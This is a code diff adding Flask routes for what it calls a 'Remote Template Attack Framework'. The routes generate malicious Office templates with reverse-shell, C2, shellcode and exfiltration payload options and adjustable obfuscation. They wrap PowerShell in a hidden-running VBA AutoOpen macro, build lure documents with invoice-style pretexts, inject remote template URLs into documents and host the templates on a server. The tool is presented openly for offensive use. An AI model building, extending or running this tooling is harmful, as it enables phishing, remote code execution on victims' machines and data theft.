@@ -1,0 +1,355 @@
+"""
+Flask routes for Office Template Injection Engine
+Remote Template Attack Framework
+"""
+
+from flask import Blueprint, render_template, request, jsonify, send_file
+import sys
+import os
+import io
+import tempfile
+
+# Add tools directory to path
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))
+
+from office_template_injector import (
+    get_injector, DocumentType, PayloadType, InjectionMethod
+)
+
+# Add cybermodules for encoder
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+from cybermodules.payload_generator import PowerShellEncoder
+
+office_template_bp = Blueprint('office_template', __name__, url_prefix='/office-template')
+
+
+@office_template_bp.route('/')
+def index():
+    """Office Template Injection main page"""
+    injector = get_injector()
+    stats = injector.get_stats()
+    templates = injector.get_templates()
+    documents = injector.get_documents()
+    
+    return render_template('office_template.html',
+                           stats=stats,
+                           templates=templates[:20],
+                           documents=documents[:20],
+                           document_types=[d.value for d in DocumentType],
+                           payload_types=[p.value for p in PayloadType],
+                           injection_methods=[i.value for i in InjectionMethod],
+                           pretexts=list(injector.DOCUMENT_PRETEXTS.keys()))
+
+
+@office_template_bp.route('/api/create-template', methods=['POST'])
+def create_template():
+    """Create a malicious Office template"""
+    try:
+        data = request.get_json()
+        name = data.get('name', 'MaliciousTemplate')
+        doc_type = data.get('doc_type', 'word')
+        payload_type = data.get('payload_type', 'reverse_shell')
+        custom_payload = data.get('custom_payload')
+        custom_payload_mode = data.get('custom_payload_mode', False)
+        obfuscation_level = data.get('obfuscation_level', 'basic')  # 'none', 'basic', 'advanced'
+        
+        # Payload parameters
+        payload_params = {}
+        for key in ['payload', 'host', 'port', 'c2_url', 'interval', 'payload_url',
+                    'shellcode_b64', 'exfil_url']:
+            if key in data:
+                payload_params[key] = data[key]
+        
+        # Custom payload mode: use direct payload instead of auto-generation
+        if custom_payload_mode and payload_params.get('payload'):
+            payload_type = 'custom'
+            
+            # AUTO-ENCODE: Custom payload'ı PowerShell one-liner'a dönüştür
+            raw_payload = payload_params['payload'].strip()
+            
+            # Detect language and prepare encoding
+            if raw_payload.lower().startswith('powershell') or 'powershell' in raw_payload.lower():
+                # Already a PS one-liner, just wrap it
+                payload_params['payload'] = raw_payload
+            elif any(raw_payload.startswith(x) for x in ['IEX', '$', 'Import-Module', '[', 'Add-Type']):
+                # PowerShell code detected - encode it
+                try:
+                    encoded_ps = PowerShellEncoder.generate_oneliner(
+                        raw_payload, 
+                        obfuscation_level=obfuscation_level
+                    )
+                    
+                    # If result is VBA code (contains "Sub AutoOpen"), use it directly
+                    if 'Sub AutoOpen' in encoded_ps:
+                        payload_params['payload'] = encoded_ps
+                        custom_payload = encoded_ps  # Override custom_payload too
+                    else:
+                        # It's a one-liner, wrap in VBA
+                        vba_wrapper = f"""Sub AutoOpen()
+    Dim cmd As String
+    cmd = "{encoded_ps}"
+    CreateObject("WScript.Shell").Run cmd, 0, False
+End Sub"""
+                        payload_params['payload'] = vba_wrapper
+                        custom_payload = vba_wrapper
+                except Exception as e:
+                    sys.stderr.write(f"[OFFICE_TEMPLATE] Encoding error: {e}\n")
+                    # Fallback to original
+                    payload_params['payload'] = raw_payload
+            else:
+                # Keep as-is (bash, python, etc.)
+                payload_params['payload'] = raw_payload
+        
+        injector = get_injector()
+        template = injector.create_malicious_template(
+            name=name,
+            doc_type=DocumentType(doc_type),
+            payload_type=PayloadType(payload_type) if payload_type != 'custom' else PayloadType('reverse_shell'),
+            payload_params=payload_params,
+            custom_payload=custom_payload,
+            use_custom_payload_direct=custom_payload_mode
+        )
+        
+        sys.stderr.write(f"[OFFICE_TEMPLATE] Template created: {name} | Obfuscation: {obfuscation_level} | Size: {len(template.payload)}\n")
+        
+        return jsonify({
+            'success': True,
+            'template_id': template.template_id,
+            'name': template.name,
+            'doc_type': template.doc_type.value,
+            'payload_type': 'custom' if custom_payload_mode else template.payload_type.value,
+            'obfuscation_level': obfuscation_level,
+            'payload_preview': template.payload[:200] + '...' if len(template.payload) > 200 else template.payload,
+            'payload_size': len(template.payload)
+        })
+    except Exception as e:
+        sys.stderr.write(f"[OFFICE_TEMPLATE] Error: {str(e)}\n")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/create-document', methods=['POST'])
+def create_document():
+    """Create a clean document with pretext"""
+    try:
+        data = request.get_json()
+        pretext = data.get('pretext', 'invoice')
+        doc_type = data.get('doc_type', 'word')
+        
+        # Pretext parameters
+        pretext_params = {}
+        for key in ['invoice_num', 'name', 'quarter', 'year']:
+            if key in data:
+                pretext_params[key] = data[key]
+        
+        injector = get_injector()
+        
+        # Create temp file
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.docx') as f:
+            output_path = f.name
+        
+        doc_path = injector.create_clean_document(
+            pretext=pretext,
+            doc_type=DocumentType(doc_type),
+            output_path=output_path,
+            **pretext_params
+        )
+        
+        # Read and return document
+        with open(doc_path, 'rb') as f:
+            doc_content = f.read()
+        
+        import base64
+        os.unlink(doc_path)
+        
+        return jsonify({
+            'success': True,
+            'filename': os.path.basename(doc_path),
+            'content_b64': base64.b64encode(doc_content).decode(),
+            'size': len(doc_content)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/inject-template', methods=['POST'])
+def inject_template():
+    """Inject remote template into a document"""
+    try:
+        data = request.get_json()
+        template_url = data.get('template_url')
+        doc_type = data.get('doc_type', 'word')
+        
+        # Document can be provided as base64 or created fresh
+        doc_b64 = data.get('document_b64')
+        pretext = data.get('pretext')
+        pretext_params = data.get('pretext_params', {})
+        
+        if not template_url:
+            return jsonify({'success': False, 'error': 'template_url required'}), 400
+        
+        injector = get_injector()
+        
+        # Create input document
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.docx') as f:
+            input_path = f.name
+        
+        if doc_b64:
+            import base64
+            doc_content = base64.b64decode(doc_b64)
+            with open(input_path, 'wb') as f:
+                f.write(doc_content)
+        else:
+            # Create clean document
+            injector.create_clean_document(
+                pretext=pretext or 'invoice',
+                doc_type=DocumentType(doc_type),
+                output_path=input_path,
+                **pretext_params
+            )
+        
+        # Create output path
+        with tempfile.NamedTemporaryFile(delete=False, suffix='_injected.docx') as f:
+            output_path = f.name
+        
+        # Inject template
+        injected = injector.inject_remote_template(
+            input_file=input_path,
+            template_url=template_url,
+            output_file=output_path,
+            doc_type=DocumentType(doc_type)
+        )
+        
+        # Read injected document
+        with open(output_path, 'rb') as f:
+            injected_content = f.read()
+        
+        import base64
+        os.unlink(input_path)
+        os.unlink(output_path)
+        
+        return jsonify({
+            'success': True,
+            'doc_id': injected.doc_id,
+            'name': injected.name,
+            'template_url': injected.template_url,
+            'injection_method': injected.injection_method.value,
+            'content_b64': base64.b64encode(injected_content).decode(),
+            'size': len(injected_content)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/download-template/<template_id>')
+def download_template(template_id):
+    """Download a malicious template file"""
+    try:
+        injector = get_injector()
+        
+        # Export to temp file
+        with tempfile.NamedTemporaryFile(delete=False) as f:
+            output_path = f.name
+        
+        exported = injector.export_template(template_id, output_path)
+        
+        if not exported:
+            return jsonify({'success': False, 'error': 'Template not found'}), 404
+        
+        with open(exported, 'rb') as f:
+            content = f.read()
+        
+        os.unlink(exported)
+        
+        return send_file(
+            io.BytesIO(content),
+            mimetype='application/octet-stream',
+            as_attachment=True,
+            download_name=os.path.basename(exported)
+        )
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/start-server', methods=['POST'])
+def start_server():
+    """Start template hosting server"""
+    try:
+        data = request.get_json() or {}
+        host = data.get('host', '0.0.0.0')
+        port = data.get('port', 8888)
+        
+        injector = get_injector()
+        injector.start_template_server(host=host, port=port)
+        
+        return jsonify({
+            'success': True,
+            'message': f'Server started on http://{host}:{port}',
+            'host': host,
+            'port': port
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/stop-server', methods=['POST'])
+def stop_server():
+    """Stop template hosting server"""
+    try:
+        injector = get_injector()
+        injector.stop_template_server()
+        
+        return jsonify({
+            'success': True,
+            'message': 'Server stopped'
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@office_template_bp.route('/api/templates')
+def list_templates():
+    """List all templates"""
+    injector = get_injector()
+    templates = injector.get_templates()
+    return jsonify({'success': True, 'templates': templates})
+
+
+@office_template_bp.route('/api/documents')
+def list_documents():
+    """List all injected documents"""
+    injector = get_injector()
+    documents = injector.get_documents()
+    return jsonify({'success': True, 'documents': documents})
+
+
+@office_template_bp.route('/api/pretexts')
+def list_pretexts():
+    """List available document pretexts"""
+    injector = get_injector()
+    return jsonify({
+        'success': True,
+        'pretexts': [
+            {'key': k, 'title': v['title'], 'content': v['content']}
+            for k, v in injector.DOCUMENT_PRETEXTS.items()
+        ]
+    })
+
+
+@office_template_bp.route('/api/payload-templates')
+def list_payload_templates():
+    """List available VBA macro templates"""
+    injector = get_injector()
+    return jsonify({
+        'success': True,
+        'templates': [
+            {'type': p.value, 'name': p.name}
+            for p in PayloadType
+        ]
+    })
+
+
+@office_template_bp.route('/api/stats')
+def get_stats():
+    """Get engine statistics"""
+    injector = get_injector()
+    return jsonify({'success': True, 'stats': injector.get_stats()})
